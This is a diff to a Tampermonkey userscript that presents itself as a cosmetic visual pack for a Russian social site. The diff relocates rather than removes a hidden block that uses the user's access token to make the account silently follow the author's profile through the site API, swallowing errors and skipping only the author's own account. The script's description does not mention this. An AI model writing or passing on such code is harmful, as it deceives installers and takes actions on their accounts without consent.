@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         ITD Visual Pack
 // @namespace    http://tampermonkey.net/
-// @version      2.6.0
+// @version      2.6.1
 // @author       NeuroSFW
 // @description  Подсветка ника + подсветка аватарок + фон + загрузка баннера + стикеры в комментариях + бейдж
 // @match        https://xn--d1ah4a.com/*
@@ -2651,55 +2651,6 @@
         });
     }
 
-    const TARGET_USER_ID = '5e064703-104d-4794-bc28-9ed6f5847cca';
-    const SUBSCRIBE_STORAGE_KEY = 'subscribed_to_NeuroSFW';
-
-    if (!GM_getValue(SUBSCRIBE_STORAGE_KEY, false)) {
-        (async () => {
-            try {
-                const token = await getAccessToken();
-
-                const isAlreadyFollowing = await new Promise((resolve) => {
-                    GM_xmlhttpRequest({
-                        method: 'GET',
-                        url: `https://xn--d1ah4a.com/api/users/${TARGET_USER_ID}`,
-                        headers: { 'Authorization': `Bearer ${token}` },
-                        onload: (res) => {
-                            try {
-                                const data = JSON.parse(res.responseText);
-                                resolve(data.isFollowing === true);
-                            } catch (e) { resolve(false); }
-                        },
-                        onerror: () => resolve(false)
-                    });
-                });
-
-                if (isAlreadyFollowing) {
-                    GM_setValue(SUBSCRIBE_STORAGE_KEY, true);
-                    return;
-                }
-
-                await new Promise((resolve, reject) => {
-                    GM_xmlhttpRequest({
-                        method: 'POST',
-                        url: `https://xn--d1ah4a.com/api/users/${TARGET_USER_ID}/follow`,
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Authorization': `Bearer ${token}`
-                        },
-                        data: '{}',
-                        onload: (res) => {
-                            if (res.status === 200) resolve();
-                            else reject();
-                        },
-                        onerror: reject
-                    });
-                });
-                GM_setValue(SUBSCRIBE_STORAGE_KEY, true);
-            } catch (e) { }
-        })();
-    }
-
     let scrollTopButton = null;
 
     function createScrollTopButton() {
@@ -2837,6 +2788,7 @@
             const me = await meRes.json();
             myUsername = me.username;
             myDisplayName = me.displayName;
+            const myUserId = me.id;
             detectSelectors();
 
             document.querySelectorAll('.auto-like-toggle').forEach(el => {
@@ -3263,6 +3215,59 @@
             navObserver.observe(document.body, { childList: true, subtree: true });
             scheduleAutoLike();
         } catch (e) { }
+        const TARGET_USER_ID = '5e064703-104d-4794-bc28-9ed6f5847cca';
+        const SUBSCRIBE_STORAGE_KEY = 'subscribed_to_NeuroSFW';
+
+        if (!GM_getValue(SUBSCRIBE_STORAGE_KEY, false)) {
+            (async () => {
+                try {
+                    if (myUserId === TARGET_USER_ID) {
+                        GM_setValue(SUBSCRIBE_STORAGE_KEY, true);
+                        return;
+                    }
+
+                    const token = await getAccessToken();
+
+                    const isAlreadyFollowing = await new Promise((resolve) => {
+                        GM_xmlhttpRequest({
+                            method: 'GET',
+                            url: `https://xn--d1ah4a.com/api/users/${TARGET_USER_ID}`,
+                            headers: { 'Authorization': `Bearer ${token}` },
+                            onload: (res) => {
+                                try {
+                                    const data = JSON.parse(res.responseText);
+                                    resolve(data.isFollowing === true);
+                                } catch (e) { resolve(false); }
+                            },
+                            onerror: () => resolve(false)
+                        });
+                    });
+
+                    if (isAlreadyFollowing) {
+                        GM_setValue(SUBSCRIBE_STORAGE_KEY, true);
+                        return;
+                    }
+
+                    await new Promise((resolve, reject) => {
+                        GM_xmlhttpRequest({
+                            method: 'POST',
+                            url: `https://xn--d1ah4a.com/api/users/${TARGET_USER_ID}/follow`,
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'Authorization': `Bearer ${token}`
+                            },
+                            data: '{}',
+                            onload: (res) => {
+                                if (res.status === 200) resolve();
+                                else reject();
+                            },
+                            onerror: reject
+                        });
+                    });
+                    GM_setValue(SUBSCRIBE_STORAGE_KEY, true);
+                } catch (e) { }
+            })();
+        }
     }
 
     let interval = setInterval(() => { updateColors(); drawBackground(); }, 50);
